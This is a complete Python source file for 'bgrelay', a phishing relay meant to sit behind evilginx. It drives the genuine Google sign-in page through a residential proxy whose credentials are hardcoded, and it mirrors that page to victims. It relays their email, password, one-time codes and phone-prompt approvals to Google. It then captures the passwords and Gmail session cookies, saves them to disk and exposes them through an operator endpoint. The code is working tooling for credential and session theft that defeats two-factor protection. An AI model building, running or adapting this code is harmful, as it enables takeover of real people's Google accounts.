#!/usr/bin/env python3
"""bgrelay — real-browser relay for Google sign-in (botguard-safe, DOM mirror).

Architecture (user-approved): re-render as much of the REAL Google page as
possible on the victim side via DOM mirroring — the sidecar (patchright,
headful Xvfb, residential exit) drives the genuine accounts.google.com flow
and every poll ships (1) the card's outerHTML + the page's CSS with resource
URLs rewritten through /__relay/api/res, and (2) a cropped live screenshot
used as the transition/fallback layer. The victim types directly into the
mirrored REAL inputs; submits are intercepted and relayed to the sidecar.
Only what cannot be re-rendered (mid-transition states) falls back to the
live image.

Endpoints (behind evilginx /__relay/ or a relay LURE path):
  GET  /                       victim page
  POST /api/start {email?}     -> {id}
  GET  /api/state?id=&h=<hash> -> {state, hint, need_input, match_number,
                                   screenshot, dom, styles, dom_hash}
  POST /api/input {id,kind,value}
  GET  /api/res?u=<url>        cached sidecar-loaded asset (css/font/img)
  GET  /api/sessions (X-Op-Key)

Env: RELAY_SOCKS, RELAY_PORT (9445), RELAY_BRIDGE_PORT (8119), RELAY_STORE.
"""

import base64
import hashlib
import json
import os
import queue
import re
import secrets
import socket
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs, quote

from patchright.sync_api import sync_playwright

RELAY_PORT = int(os.environ.get("RELAY_PORT", "9445"))
BRIDGE_PORT = int(os.environ.get("RELAY_BRIDGE_PORT", "8119"))
SOCKS = os.environ.get(
    "RELAY_SOCKS",
    "socks5://ceGKVX:YqWshv@14.224.158.32:48726",
)
OP_KEY = os.environ.get("RELAY_OP_KEY") or secrets.token_hex(12)
STORE_DIR = os.path.expanduser(os.environ.get("RELAY_STORE", "~/bgrelay-store"))
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36")
SIGNIN_URL = "https://accounts.google.com/ServiceLogin?hl={hl}&continue=https%3A%2F%2Fmail.google.com%2F"

# global asset cache shared by sessions (styles/fonts identical per page)
RES_CACHE = {}
RES_LOCK = threading.Lock()
ASSET_HOSTS = ("gstatic.com", "googleapis.com", "googleusercontent.com",
               "google.com", "google.vn")

os.makedirs(STORE_DIR, exist_ok=True)


# ---------------------------------------------------------------- bridge ---
def parse_socks():
    m = re.match(r"socks5://([^:]+):([^@]+)@([\d.]+):(\d+)", SOCKS)
    if not m:
        sys.exit("RELAY_SOCKS must be socks5://user:pass@host:port")
    return m.group(3), int(m.group(4)), m.group(1), m.group(2)


def start_bridge():
    """Local HTTP CONNECT proxy -> upstream SOCKS5 (chromium can't do socks auth)."""
    import socks as pysocks  # pip pysocks

    up_host, up_port, up_user, up_pass = parse_socks()

    def pipe(a, b):
        try:
            while True:
                d = a.recv(65536)
                if not d:
                    break
                b.sendall(d)
        except Exception:
            pass
        finally:
            for s in (a, b):
                try:
                    s.close()
                except Exception:
                    pass

    def handle(c):
        try:
            req = b""
            while b"\r\n\r\n" not in req:
                chunk = c.recv(4096)
                if not chunk:
                    return
                req += chunk
            line = req.split(b"\r\n")[0].decode()
            method, target = line.split()[0], line.split()[1]
            if method != "CONNECT":
                c.sendall(b"HTTP/1.1 405 CONNECT only\r\n\r\n")
                return
            host, port = target.rsplit(":", 1)
            s = pysocks.socksocket()
            s.set_proxy(pysocks.SOCKS5, up_host, up_port, True, up_user, up_pass)
            s.settimeout(30)
            s.connect((host, int(port)))
            s.settimeout(None)
            c.sendall(b"HTTP/1.1 200 Connected\r\n\r\n")
            threading.Thread(target=pipe, args=(c, s), daemon=True).start()
            pipe(s, c)
        except Exception:
            try:
                c.close()
            except Exception:
                pass

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", BRIDGE_PORT))
    srv.listen(64)
    print(f"[bridge] 127.0.0.1:{BRIDGE_PORT} -> {up_host}:{up_port}", flush=True)
    while True:
        threading.Thread(target=handle, args=(srv.accept()[0],), daemon=True).start()


def ensure_xvfb():
    display = os.environ.get("DISPLAY", ":99")
    num = display.lstrip(":").split(".")[0]
    try:
        subprocess.run(["xdpyinfo", "-display", f":{num}"], check=True,
                       capture_output=True, timeout=5)
        return display
    except Exception:
        subprocess.Popen(["Xvfb", f":{num}", "-screen", "0", "3840x2160x24"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1.5)
        return display


# ------------------------------------------------------------- asset ops ---
FETCH_JS = """async u => {
  const r = await fetch(u);
  const b = await r.arrayBuffer();
  const u8 = new Uint8Array(b);
  let s = '';
  for (let i = 0; i < u8.length; i += 8192)
    s += String.fromCharCode.apply(null, u8.subarray(i, i + 8192));
  return {ct: r.headers.get('content-type') || '', b64: btoa(s)};
}"""


def res_proxy_url(u):
    return "/__relay/api/res?u=" + quote(u, safe="")


def rewrite_css_urls(css_text, base_url):
    """Rewrite url(...) references to the res proxy. Returns (css, found_urls)."""
    found = []

    def repl(m):
        raw = m.group(1).strip().strip('"').strip("'")
        if raw.startswith("data:") or raw.startswith("#"):
            return m.group(0)
        if raw.startswith("//"):
            raw = "https:" + raw
        elif raw.startswith("/"):
            p = urlparse(base_url)
            raw = f"{p.scheme}://{p.netloc}{raw}"
        elif not raw.startswith("http"):
            p = urlparse(base_url)
            raw = f"{p.scheme}://{p.netloc}/{raw}"
        host = urlparse(raw).hostname or ""
        if not any(host == h or host.endswith("." + h) for h in ASSET_HOSTS):
            return m.group(0)
        found.append(raw)
        return f"url({res_proxy_url(raw)})"

    css = re.sub(r"url\(([^)]+)\)", repl, css_text)
    return css, found


def fetch_via_bridge(url):
    """Server-side fetch through the residential bridge — immune to page CORS."""
    import urllib.request
    proxy = urllib.request.ProxyHandler({
        "http": f"http://127.0.0.1:{BRIDGE_PORT}",
        "https": f"http://127.0.0.1:{BRIDGE_PORT}"})
    opener = urllib.request.build_opener(proxy)
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    with opener.open(req, timeout=15) as r:
        return (r.headers.get("Content-Type", "").split(";")[0].strip()
                or "application/octet-stream"), r.read()


def fetch_asset(pg, url, budget):
    """Fetch via the sidecar page (cookies/CORS correct); store in RES_CACHE."""
    with RES_LOCK:
        if url in RES_CACHE:
            return True
    if budget["n"] <= 0 or budget["bytes"] > 4 * 1024 * 1024:
        return False
    try:
        try:
            r = pg.evaluate(FETCH_JS, url)
            ct = r["ct"].split(";")[0].strip() or "application/octet-stream"
            raw = base64.b64decode(r["b64"])
        except Exception:
            ct, raw = fetch_via_bridge(url)
        if len(raw) > 512 * 1024:
            return False
        with RES_LOCK:
            RES_CACHE[url] = (ct, raw)
        budget["n"] -= 1
        budget["bytes"] += len(raw)
        return True
    except Exception as e:
        print(f"[res-miss] {url[:90]}: {str(e)[:80]}", flush=True)
        return False


# --------------------------------------------------------------- session ---
class RelaySession(threading.Thread):

    def __init__(self, sid, email=None, locale=None):
        super().__init__(daemon=True)
        self.id = sid
        self.email = email
        self.locale = locale or "en-US"      # mirror the victim's UI language
        self.password = None
        self.state = "init"
        self.hint = "Đang mở trang đăng nhập…"
        self.need_input = None
        self.screenshot = None          # b64 jpeg fallback/transition layer
        self.shot_hash = None           # md5 of the current frame (delta API)
        self.match_number = None
        self.error = None
        self.cookies = None
        self.inputs = queue.Queue()
        self.clicks = queue.Queue()   # (px, py) percent-of-card taps from victim
        self.last_active = time.time()
        self.deadline = time.time() + 8 * 60
        self.finished = False
        # overlay geometry (percent of the card image) for the relay input
        self.input_box = None      # {x,y,w,h} percent floats
        self.button_box = None
        self.input_kind = None     # email | password | code
        self.styles = []                # rewritten CSS texts (stable per page)
        self._res_budget = {"n": 24, "bytes": 0}  # card-asset prefetch budget

    # -- helpers ------------------------------------------------------------
    def _body(self, pg):
        try:
            return pg.inner_text("body")
        except Exception:
            return ""

    def _visible(self, pg, sel):
        try:
            return pg.locator(sel).first.is_visible()
        except Exception:
            return False

    # ---- DOM mirror -------------------------------------------------------
    def _prefetch_assets(self, pg):
        """One-shot: collect inline styles + external sheets + their assets."""
        budget = {"n": 16, "bytes": 0}
        styles = []
        try:
            inline = pg.evaluate(
                "() => [...document.querySelectorAll('style')].map(s => s.textContent)")
            for txt in inline or []:
                css, urls = rewrite_css_urls(txt, SIGNIN_URL.format(hl="en"))
                for u in urls:
                    fetch_asset(pg, u, budget)
                styles.append(css)
        except Exception as e:
            print(f"[assets-inline] {str(e)[:100]}", flush=True)
        try:
            sheets = pg.evaluate(
                "() => [...document.styleSheets].filter(s => s.href).map(s => s.href)")
            for href in (sheets or [])[:6]:
                if not fetch_asset(pg, href, {"n": 1, "bytes": 0}):
                    continue
                with RES_LOCK:
                    raw = RES_CACHE.get(href)
                if not raw:
                    continue
                css_text = raw[1].decode("utf-8", "replace")
                css, urls = rewrite_css_urls(css_text, href)
                for u in urls:
                    fetch_asset(pg, u, budget)
                styles.append(css)
        except Exception as e:
            print(f"[assets-sheets] {str(e)[:100]}", flush=True)
        # CSD disguise for mirrored password fields + keep hidden ones hidden
        styles.append("input[data-eg=pw]{-webkit-text-security:disc}")
        styles.append("input[data-eg=pw-hid]{display:none!important}")
        self.styles = styles
        print(f"[assets] {self.id}: {len(styles)} css blocks, "
              f"{len(RES_CACHE)} cached urls", flush=True)

    DOC_JS = """() => {
      const h = document.head.innerHTML;
      const b = document.body.outerHTML;
      return {head: h, body: b};
    }"""

    INPUT_SELS = [("input[name='Passwd']", "password"),
                  ("#identifierId", "email"),
                  ("input[name='totpPin']", "code"),
                  ("input[type='tel']", "code")]

    def _card_box(self, pg):
        """Bounding box of the centered sign-in card, viewport coords."""
        for sel in ("#initialView", "div[role='main']", "main"):
            try:
                loc = pg.locator(sel).first
                if loc.is_visible():
                    box = loc.bounding_box()
                    if box and box["width"] > 50:
                        return box
            except Exception:
                continue
        return None

    def _dom_snapshot(self, pg):
        """Extract the active input/button geometry relative to the card, so
        the victim page can overlay a real input exactly where Google's
        input renders in the live screenshot."""
        try:
            cbox = self._card_box(pg)
            if not cbox:
                return
            ibox = None
            kind = self.input_kind
            for sel, k in self.INPUT_SELS:
                loc = pg.locator(sel).first
                try:
                    if loc.is_visible():
                        b = loc.bounding_box()
                        if b:
                            ibox, kind = b, k
                            break
                except Exception:
                    continue
            self.input_kind = kind
            self.input_box = None
            self.button_box = None
            if ibox:
                # widen to the visible field WRAPPER (includes floating label
                # + border) so the overlay fully replaces Google's field
                try:
                    pbox = loc.evaluate(
                        "el => { const p = el.parentElement; if (!p) return null;"
                        " const r = p.getBoundingClientRect();"
                        " return {x: r.x, y: r.y, w: r.width, h: r.height}; }")
                    if pbox and 1.0 <= pbox["h"] / max(1.0, ibox["height"]) <= 2.2 \
                            and 0.85 <= pbox["w"] / max(1.0, ibox["width"]) <= 1.6:
                        ibox = {"x": pbox["x"], "y": pbox["y"],
                                "width": pbox["w"], "height": pbox["h"]}
                except Exception:
                    pass
                self.input_box = {
                    "x": round(100 * (ibox["x"] - cbox["x"]) / cbox["width"], 2),
                    "y": round(100 * (ibox["y"] - cbox["y"]) / cbox["height"], 2),
                    "w": round(100 * ibox["width"] / cbox["width"], 2),
                    "h": round(100 * ibox["height"] / cbox["height"], 2)}
                # the real button (wrapper divs inflate the box ~52px; the
                # inner button is Google's ~40px pill)
                for bsel in ("#identifierNext button", "#passwordNext button",
                             "#totpNext button", "button:has-text('Next')"):
                    bloc = pg.locator(bsel).first
                    try:
                        if bloc.is_visible():
                            bb = bloc.bounding_box()
                            if bb:
                                self.button_box = {
                                    "x": round(100 * (bb["x"] - cbox["x"]) / cbox["width"], 2),
                                    "y": round(100 * (bb["y"] - cbox["y"]) / cbox["height"], 2),
                                    "w": round(100 * bb["width"] / cbox["width"], 2),
                                    "h": round(100 * bb["height"] / cbox["height"], 2)}
                                break
                    except Exception:
                        continue
        except Exception:
            pass

    def _do_click(self, pg, px, py):
        """Relay a victim tap on the mirrored card (percent coords) to the
        real page — makes every button/link in the screenshot functional."""
        cbox = self._card_box(pg)
        if not cbox:
            return
        x = max(0, min(1920, cbox["x"] + cbox["width"] * px / 100.0))
        y = max(0, min(1080, cbox["y"] + cbox["height"] * py / 100.0))
        try:
            pg.mouse.click(x, y)
            print(f"[click] {self.id}: {px:.1f},{py:.1f} -> {x:.0f},{y:.0f}", flush=True)
        except Exception as e:
            print(f"[click-err] {self.id}: {str(e)[:80]}", flush=True)

    def _drain_clicks(self, pg):
        for _ in range(4):
            try:
                px, py = self.clicks.get_nowait()
            except queue.Empty:
                return
            self.last_active = time.time()
            self._do_click(pg, px, py)
            time.sleep(0.3)

    def _stream(self, pg):
        """Refresh the mirror: DOM snapshot + screenshot + number extraction."""
        self._dom_snapshot(pg)
        try:
            shot = None
            cbox = self._card_box(pg)
            if cbox and cbox["width"] > 250 and cbox["height"] > 150:
                for sel in ("#initialView", "div[role='main']", "main"):
                    try:
                        loc = pg.locator(sel).first
                        if loc.is_visible():
                            shot = loc.screenshot(type="jpeg", quality=82,
                                                  scale="device")
                            break
                    except Exception:
                        continue
            if shot is None:
                shot = pg.screenshot(type="jpeg", quality=80,
                                     clip={"x": 360, "y": 120, "width": 1200, "height": 840})
            self.screenshot = base64.b64encode(shot).decode()
            self.shot_hash = hashlib.md5(shot).hexdigest()[:12]
        except Exception as e:
            if not getattr(self, "_shot_err_logged", False):
                self._shot_err_logged = True
                print(f"[shot-err] {self.id}: {type(e).__name__}: {str(e)[:160]}", flush=True)
        try:
            body = self._body(pg)
            cands = re.findall(r"(?m)^\s*(\d{2})\s*$", body)
            if not cands:
                cands = re.findall(r"(?<!\d)(\d{2})(?!\d)", body[:400])
            if cands and self.state == "challenge":
                self.match_number = cands[0]
        except Exception:
            pass

    def _classify(self, pg):
        host = (urlparse(pg.url).hostname or "").lower()
        body = self._body(pg)
        if host in ("mail.google.com", "myaccount.google.com"):
            return "done"
        if self._visible(pg, "input[name='Passwd']") or self._visible(pg, "input[type='password']"):
            return "password"
        low = body.lower()
        if self._visible(pg, "input[name='totpPin']") or "enter a code" in low \
                or "nhập mã" in low or "mã xác minh" in low \
                or "verify it" in low or "2-step" in low or "xác minh 2 bước" in low:
            return "challenge"
        if ("couldn" in low and "find" in low) or "không tìm thấy" in low:
            return "error_bad_account"
        if "wrong password" in low or "mật khẩu không chính xác" in low:
            return "password_retry"
        if "not be secure" in low or "không an toàn" in low:
            return "error_botguard"
        return None

    def _wait_input(self, pg, kind, hint):
        """Wait for the victim's input while keeping the mirror streaming."""
        self.state = {"code": "challenge", "email": "init_email"}.get(kind, kind)
        self.need_input = kind
        self.hint = hint
        remaining = max(1.0, self.deadline - time.time())
        rounds = int(remaining / 1.2) + 1
        for _ in range(rounds):
            try:
                item = self.inputs.get(timeout=1.2)
                self.last_active = time.time()
                return item
            except queue.Empty:
                self._drain_clicks(pg)
                self._stream(pg)
                if time.time() > self.deadline:
                    return ("abort", None)
        return ("abort", None)

    def _collect(self, pg):
        out = []
        try:
            for c in pg.context.cookies():
                dom = c.get("domain", "")
                if "google.com" in dom:
                    out.append({"name": c["name"], "value": c["value"],
                                "domain": dom, "path": c.get("path", "/"),
                                "expires": c.get("expires", -1)})
        except Exception:
            pass
        return out

    def _finish(self, pg, state, hint=""):
        self.state = state
        self.hint = hint
        self.need_input = None
        self.finished = True
        try:
            self._stream(pg)
        except Exception:
            pass
        if state == "done":
            self.cookies = self._collect(pg)
            rec = {"id": self.id, "email": self.email, "password": self.password,
                   "cookies": self.cookies, "ua": UA, "ts": int(time.time())}
            path = os.path.join(STORE_DIR, self.id + ".json")
            with open(path, "w") as f:
                json.dump(rec, f, indent=1)
            print(f"[capture] {self.email} -> {path} "
                  f"({len(self.cookies)} cookies)", flush=True)

    # -- main loop ----------------------------------------------------------
    def run(self):
        os.environ["DISPLAY"] = ensure_xvfb()
        pw = None
        try:
            pw = sync_playwright().start()
            browser = pw.chromium.launch(
                headless=False,
                args=["--no-sandbox", "--disable-dev-shm-usage",
                      "--window-size=1920,1080"],
                proxy={"server": f"http://127.0.0.1:{BRIDGE_PORT}"})
            pg = browser.new_page(user_agent=UA, locale=self.locale,
                                  viewport={"width": 1920, "height": 1080},
                                  device_scale_factor=2)  # 2x raster, sharp on HiDPI victims
            pg.goto(SIGNIN_URL.format(hl="vi" if self.locale.startswith("vi") else "en"),
                    wait_until="load", timeout=60000)
            pg.wait_for_selector("#identifierId", timeout=20000)
            pg.wait_for_selector("#identifierNext", state="visible", timeout=20000)
            time.sleep(2)  # let the v3 app finish booting so the click registers
            self._prefetch_assets(pg)
            if not self.email:
                # mirror-first: the victim interacts with the REAL mirrored
                # identifier card — no fake UI anywhere
                item = self._wait_input(pg, "email", "Nhập email của bạn")
                if item[0] == "abort":
                    self._finish(pg, "error", "Hết thời gian phiên")
                    browser.close()
                    return
                self.email = item[1]
            pg.fill("#identifierId", self.email)
            time.sleep(0.5)
            pg.click("#identifierNext")

            # ---- identifier -> password / challenge / error -------------
            st = None
            for i in range(45):
                time.sleep(1)
                self._stream(pg)
                st = self._classify(pg)
                if st:
                    break
            if st in (None, "error_bad_account", "error_botguard"):
                self._finish(pg, "error",
                             "Không tìm thấy tài khoản Google này." if st == "error_bad_account"
                             else "Google tạm thời từ chối — thử lại sau.")
                browser.close()
                return
            retries = 0
            while time.time() < self.deadline:
                if st in ("password", "password_retry"):
                    item = self._wait_input(pg, "password",
                                            "Nhập mật khẩu của tài khoản " + str(self.email))
                    if item[0] == "abort":
                        break
                    if self.password is None:
                        self.password = item[1]
                    try:
                        pg.fill("input[name='Passwd']", item[1], timeout=5000)
                    except Exception:
                        try:
                            pg.fill("input[type='password']", item[1], timeout=4000)
                        except Exception:
                            st = self._classify(pg) or "wait"
                            continue
                    try:
                        pg.click("#passwordNext", timeout=5000)
                    except Exception:
                        # victim may have navigated the card (Forgot password,
                        # Try another way) — follow the real flow instead of dying
                        st = self._classify(pg) or "wait"
                        continue
                    time.sleep(5)
                    st = self._classify(pg) or "wait"
                    for _ in range(12):
                        if st in ("password", "challenge", "done", "password_retry"):
                            break
                        time.sleep(1)
                        self._stream(pg)
                        st = self._classify(pg) or st
                    if st == "password_retry":
                        retries += 1
                        if retries >= 3:
                            self._finish(pg, "error", "Quá nhiều lần sai mật khẩu.")
                            break
                elif st == "challenge":
                    body = self._body(pg)
                    low = body.lower()
                    if self._visible(pg, "input[name='totpPin']") \
                            or "enter a code" in low or "nhập mã" in low:
                        item = self._wait_input(pg, "code", "Nhập mã xác minh")
                        if item[0] == "abort":
                            break
                        sel = "input[name='totpPin']" if self._visible(pg, "input[name='totpPin']") \
                            else "input[type='tel'], input[name='code']"
                        pg.fill(sel, item[1])
                        pg.click("#totpNext, button:has-text('Next')")
                        time.sleep(5)
                    else:
                        # Google prompt / number match — stream until approved
                        self.state = "challenge"
                        self.hint = "Phê duyệt trên điện thoại (nhập số hiển thị vào app)"
                        self.need_input = None
                        for _ in range(150):
                            time.sleep(1.2)
                            self._stream(pg)
                            st2 = self._classify(pg)
                            if st2 in ("done", "challenge", "password"):
                                st = st2
                                break
                        else:
                            st = None
                        continue
                    st = self._classify(pg) or "wait"
                    for _ in range(12):
                        if st in ("password", "challenge", "done", "password_retry"):
                            break
                        time.sleep(1)
                        self._stream(pg)
                        st = self._classify(pg) or st
                elif st == "done":
                    self._finish(pg, "done", "Đăng nhập thành công")
                    break
                else:
                    time.sleep(1.2)
                    self._stream(pg)
                    st = self._classify(pg) or st
            else:
                self._finish(pg, "error", "Hết thời gian phiên")
            browser.close()
        except Exception as e:
            self.state = "error"
            self.error = str(e)[:200]
            self.hint = "Lỗi phiên đăng nhập"
            self.finished = True
            print(f"[error] {self.id}: {e}", flush=True)
        finally:
            if pw:
                try:
                    pw.stop()
                except Exception:
                    pass


SESSIONS = {}
LOCK = threading.Lock()


def public_state(s, client_hash=None):
    same = bool(client_hash) and client_hash == s.shot_hash
    return {"id": s.id, "state": s.state, "hint": s.hint,
            "need_input": s.need_input, "match_number": s.match_number,
            "shot_hash": s.shot_hash,
            "screenshot": None if same else s.screenshot,
            "input_box": s.input_box, "button_box": s.button_box,
            "input_kind": s.input_kind}


# ------------------------------------------------------------------ page ---
PAGE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "page.html")
try:
    PAGE = open(PAGE_PATH, encoding="utf-8").read()
except Exception:
    PAGE = "<!doctype html><body><p>relay: page.html missing</p></body>"



# ---------------------------------------------------------------- server ---
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass

    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path, _, query = self.path.partition("?")
        if path.startswith("/__relay/"):  # same page served via evilginx or direct
            path = path[len("/__relay"):]
        qs = parse_qs(query)
        if path in ("/", "/index.html"):
            body = PAGE.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)
        elif path == "/api/state":
            sid = (qs.get("id", [""])[0])[:40]
            s = SESSIONS.get(sid)
            if not s:
                return self._json({"error": "no session"}, 404)
            return self._json(public_state(s, (qs.get("h", [None])[0])))
        elif path == "/api/res":
            u = qs.get("u", [""])[0]
            with RES_LOCK:
                hit = RES_CACHE.get(u)
            if not hit:
                return self._json({"error": "not found"}, 404)
            ct, raw = hit
            self.send_response(200)
            self.send_header("Content-Type", ct)
            self.send_header("Content-Length", str(len(raw)))
            self.send_header("Cache-Control", "public, max-age=86400")
            self.end_headers()
            self.wfile.write(raw)
        elif path == "/api/sessions":
            if self.headers.get("X-Op-Key") != OP_KEY:
                return self._json({"error": "forbidden"}, 403)
            out = []
            for s in SESSIONS.values():
                out.append({"id": s.id, "email": s.email,
                            "state": s.state, "password": s.password,
                            "cookie_count": len(s.cookies or [])})
            return self._json(out)
        else:
            self._json({"error": "not found"}, 404)

    def do_POST(self):
        path = self.path.split("?")[0]
        if path.startswith("/__relay/"):
            path = path[len("/__relay"):]
        length = int(self.headers.get("Content-Length", "0"))
        try:
            data = json.loads(self.rfile.read(length) or b"{}")
        except Exception:
            return self._json({"error": "bad json"}, 400)
        if path == "/api/start":
            email = (data.get("email") or "").strip()[:120]
            if email and not re.match(r"[^@\s]+@[^@\s]+\.[^@\s]+", email):
                return self._json({"error": "bad email"}, 400)
            if not email:
                email = None
            langs = data.get("langs") or []
            locale = "vi" if any(str(l).lower().startswith("vi") for l in langs) else "en-US"
            sid = secrets.token_hex(8)
            s = RelaySession(sid, email, locale=locale)
            with LOCK:
                SESSIONS[sid] = s
            s.start()
            print(f"[session] {sid} start email={email}", flush=True)
            return self._json({"id": sid})
        if path == "/api/input":
            s = SESSIONS.get((data.get("id") or "")[:40])
            if not s:
                return self._json({"error": "no session"}, 404)
            s.last_active = time.time()
            s.inputs.put((data.get("kind"), (data.get("value") or "")[:200]))
            return self._json({"ok": True})
        if path == "/api/click":
            s = SESSIONS.get((data.get("id") or "")[:40])
            if not s:
                return self._json({"error": "no session"}, 404)
            try:
                px, py = float(data.get("x")), float(data.get("y"))
            except (TypeError, ValueError):
                return self._json({"error": "bad coords"}, 400)
            if 0 <= px <= 100 and 0 <= py <= 100:
                s.last_active = time.time()
                s.clicks.put((px, py))
            return self._json({"ok": True})
        self._json({"error": "not found"}, 404)


def reaper():
    while True:
        time.sleep(60)
        with LOCK:
            for sid in list(SESSIONS):
                s = SESSIONS[sid]
                if s.finished and time.time() - s.last_active > 15 * 60:
                    del SESSIONS[sid]


if __name__ == "__main__":
    print(f"[bgrelay] port={RELAY_PORT} store={STORE_DIR}", flush=True)
    print(f"[bgrelay] OP_KEY={OP_KEY}", flush=True)
    threading.Thread(target=start_bridge, daemon=True).start()
    threading.Thread(target=reaper, daemon=True).start()
    ensure_xvfb()
    ThreadingHTTPServer(("127.0.0.1", RELAY_PORT), Handler).serve_forever()
